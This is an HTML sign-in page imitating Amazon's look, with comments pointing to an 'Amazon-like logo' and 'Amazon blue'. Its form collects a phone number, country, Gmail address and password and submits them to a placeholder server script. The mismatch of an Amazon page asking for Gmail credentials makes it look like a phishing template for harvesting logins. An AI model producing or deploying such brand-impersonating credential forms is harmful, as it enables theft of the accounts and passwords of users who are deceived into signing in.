<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In Page</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-image: linear-gradient(to bottom, #f7f8fa, #c9d1d9); /* Gradient background */
        }

        .logo {
            max-width: 200px;
            width: 100%;
            height: auto;
            margin-bottom: 20px;
        }

        .signin-container {
            width: 300px;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.9);
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            text-align: center;
        }

        h2 {
            color: #1a1a1a;
            font-size: 24px;
        }

        label {
            display: block;
            margin: 10px 0 5px;
            color: #555555;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            box-sizing: border-box;
            border: 1px solid #cccccc;
            border-radius: 5px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50; /* Green color for Sign In */
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        .links {
            margin-top: 15px;
            font-size: 14px;
            color: #333333;
        }

        .links a {
            color: #0066c0; /* Amazon blue color */
            text-decoration: none;
            margin: 0 10px;
        }

        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <img src="blogo.png" alt="Amazon Logo" class="logo"> <!-- Replace 'amazon_logo.png' with your Amazon-like logo image file -->
    <div class="signin-container">
        <h2>Sign In</h2>
        <form action="your_server_script.php" method="post">
            <label for="phone">Phone Number:</label>
            <input type="tel" id="phone" name="phone" required>

            <label for="country">Country:</label>
            <input type="text" id="country" name="country" required>

            <label for="gmail">Gmail Address:</label>
            <input type="email" id="gmail" name="gmail" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <button type="submit">Sign In</button>
        </form>
        <div class="links">
            <a href="#">Forgot Password?</a>
            <span>|</span>
            <a href="login.html">Already Account login</a>
        </div>
    </div>
</body>
</html>
